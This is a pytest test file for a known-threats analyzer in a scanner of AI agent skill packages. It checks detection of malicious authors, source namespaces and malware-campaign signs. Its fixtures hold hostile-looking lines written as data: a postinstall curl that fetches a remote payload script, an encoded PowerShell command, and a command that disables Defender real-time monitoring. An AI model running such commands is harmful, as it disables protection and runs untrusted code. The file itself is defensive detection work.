import tempfile
from pathlib import Path
from types import SimpleNamespace

from skills_verified.analyzers.known_threats_analyzer import KnownThreatsAnalyzer
from skills_verified.core.models import Category, Severity
from skills_verified.platforms.detector import PlatformDetector


def test_is_available():
    analyzer = KnownThreatsAnalyzer()
    assert analyzer.is_available() is True
    assert analyzer.name == "known_threats"


def test_finds_malicious_author(tmp_path):
    """Create a SKILL.md with a known malicious author from the database."""
    skill_md = tmp_path / "SKILL.md"
    skill_md.write_text(
        "---\n"
        "name: evil-tool\n"
        "description: A tool.\n"
        "author: zaycv\n"
        "---\n"
        "\n"
        "# Evil Tool\n"
    )

    detector = PlatformDetector()
    platforms = detector.detect(tmp_path)
    assert len(platforms) >= 1

    # The KnownThreatsAnalyzer._check_authors inspects platform objects
    # for an 'author' attribute. We pass SkillMetadata objects extracted
    # from the detected platforms.
    metadata_list = []
    for platform in platforms:
        meta = platform.get_skill_metadata(tmp_path)
        if meta is not None:
            metadata_list.append(meta)

    analyzer = KnownThreatsAnalyzer()
    findings = analyzer.analyze(tmp_path, platforms=metadata_list)
    author_findings = [f for f in findings if "malicious author" in f.title.lower()]
    assert len(author_findings) >= 1
    assert author_findings[0].severity == Severity.CRITICAL
    assert author_findings[0].category == Category.SUPPLY_CHAIN


def test_no_findings_clean(tmp_path):
    """A clean repo with no known threats should produce no findings."""
    clean = tmp_path / "clean.py"
    clean.write_text("x = 1 + 2\nprint(x)\n")
    analyzer = KnownThreatsAnalyzer()
    findings = analyzer.analyze(tmp_path)
    assert findings == []


def test_source_namespace_match_is_exact_and_does_not_read_git_config(tmp_path):
    analyzer = KnownThreatsAnalyzer()
    malicious_context = SimpleNamespace(
        source_input="https://github.com/26medias/example-skill.git",
        metadata=[],
    )
    benign_context = SimpleNamespace(
        source_input="https://github.com/good-26medias/example-skill.git",
        metadata=[],
    )

    findings = analyzer.analyze(tmp_path, context=malicious_context)
    benign = analyzer.analyze(tmp_path, context=benign_context)

    source_finding = next(
        finding
        for finding in findings
        if finding.rule_id == "SV-KNOWN-THREATS-SOURCE-AUTHOR"
    )
    assert source_finding.evidence is not None
    assert source_finding.evidence.snippet == malicious_context.source_input
    assert benign == []


def test_common_campaign_filenames_alone_are_not_findings(tmp_path):
    """Normal package files are not campaign evidence by themselves."""
    (tmp_path / "__init__.py").write_text("")
    (tmp_path / "setup.py").write_text("from setuptools import setup\n")
    (tmp_path / "package.json").write_text('{"name": "clean-package"}\n')

    findings = KnownThreatsAnalyzer().analyze(tmp_path)

    assert not any(
        "campaign indicator" in finding.title.lower() for finding in findings
    )
    assert not any(
        "correlated campaign" in finding.title.lower() for finding in findings
    )


def test_legitimate_claude_plugin_documentation_is_not_a_campaign_match(tmp_path):
    (tmp_path / "README.md").write_text(
        "Install the Claude Code plugin, then activate it from the marketplace.\n"
    )

    assert KnownThreatsAnalyzer().analyze(tmp_path) == []


def test_campaign_indicators_in_unrelated_files_are_not_correlated(tmp_path):
    (tmp_path / "extension.js").write_text("export function activate() {}\n")
    (tmp_path / "docs.md").write_text(
        "Examples may mention child_process, curl, and settings.json.\n"
    )

    findings = KnownThreatsAnalyzer().analyze(tmp_path)

    assert not any(
        finding.rule_id == "SV-KNOWN-THREATS-CAMP003-CORRELATED-INDICATORS"
        for finding in findings
    )


def test_common_ci_maintenance_is_not_attributed_to_malware_campaign(tmp_path):
    workflow = tmp_path / "action.yml"
    workflow.write_text(
        "run: Expand-Archive -Path $zip -DestinationPath $dir -Force\n"
        "run: Set-MpPreference -DisableRealtimeMonitoring $true\n"
    )

    assert KnownThreatsAnalyzer().analyze(tmp_path) == []


def test_correlates_campaign_filename_and_content_indicators(tmp_path):
    """A campaign finding requires independent file and content signals."""
    (tmp_path / "postinstall.sh").write_text(
        "curl https://raw.githubusercontent.com/example/payload/main/run.sh\n"
    )

    findings = KnownThreatsAnalyzer().analyze(tmp_path)

    campaign = next(
        finding
        for finding in findings
        if finding.rule_id == "SV-KNOWN-THREATS-CAMP002-CORRELATED-INDICATORS"
    )
    assert campaign.severity == Severity.HIGH
    assert campaign.evidence is not None
    assert "postinstall.sh" in campaign.evidence.snippet
    assert "raw.githubusercontent.com@postinstall.sh" in campaign.evidence.snippet
    assert campaign.remediation


def test_intrinsically_strong_campaign_pattern_still_detected(tmp_path):
    """Removing filename-only matches does not weaken strong signatures."""
    (tmp_path / "install.ps1").write_text(
        "powershell -encodedcommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
    )

    findings = KnownThreatsAnalyzer().analyze(tmp_path)

    campaign = next(
        finding
        for finding in findings
        if finding.rule_id == "SV-KNOWN-THREATS-CAMP001-PATTERN"
    )
    assert campaign.severity == Severity.CRITICAL
    assert campaign.evidence is not None
    assert "encodedcommand" in campaign.evidence.snippet
    assert campaign.remediation


def test_official_pytorch_index_is_not_attributed_to_toxicskills(tmp_path):
    (tmp_path / "install.sh").write_text(
        "pip install torch --index-url https://download.pytorch.org/whl/cu128\n"
    )

    assert KnownThreatsAnalyzer().analyze(tmp_path) == []


def test_graceful_without_yaml():
    """Analyzer works even if YAML data files are missing or empty.
    The loader returns empty lists, so the analyzer should not crash."""
    analyzer = KnownThreatsAnalyzer()
    assert analyzer.is_available() is True
    # Even with no platforms or repo, should return empty, not crash
    with tempfile.TemporaryDirectory() as td:
        findings = analyzer.analyze(Path(td))
        assert isinstance(findings, list)
